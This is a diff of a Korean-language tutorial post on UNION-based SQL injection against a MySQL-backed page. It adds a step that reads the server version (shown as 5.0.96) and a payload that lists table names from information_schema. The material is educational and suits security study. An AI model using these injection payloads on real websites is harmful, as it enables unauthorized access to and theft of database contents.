@@ -47,7 +47,14 @@ SQL 인젝션은 사용자가 데이터를 입력할 수 있는 곳 어디에서
 ==> 칼럼을 계속 추가하여 확인
 ![SQL 인젝션 UNION 문](https://user-images.githubusercontent.com/76092057/103432258-b340d600-4c1f-11eb-9645-821ad117feab.PNG){: width:"100%" height:"100%"}
 > 0' UNION SELECT ALL 1,@@version,3,4,5,6,7# <br>
-==> MySQL 버전을 확인하기 위하여 시스템 변수나 시스템 함수를 활용하여 쿼리 입력
+==> MySQL 버전을 확인하기 위하여 시스템 변수나 시스템 함수를 활용하여 쿼리 입력,
+페이지에 노출되는 칼럼은 2,3,4,5번에 위치함으로 이중 하나에 시스템 변수를 삽입
+![SQL 인젝션 MySQL 버전 확인](https://user-images.githubusercontent.com/76092057/103432327-7aedc780-4c20-11eb-921d-2365db1547a9.PNG){: width:"100%" height:"100%"}
+@@ 버전 : 5.0.96
+
+* information_schema를 사용하여 테이블 명을 확인
+  > 0' UNION SELECT ALL 1,table_name,3,4,5,6,7 from information_schema.tables# 
+
 
 
 
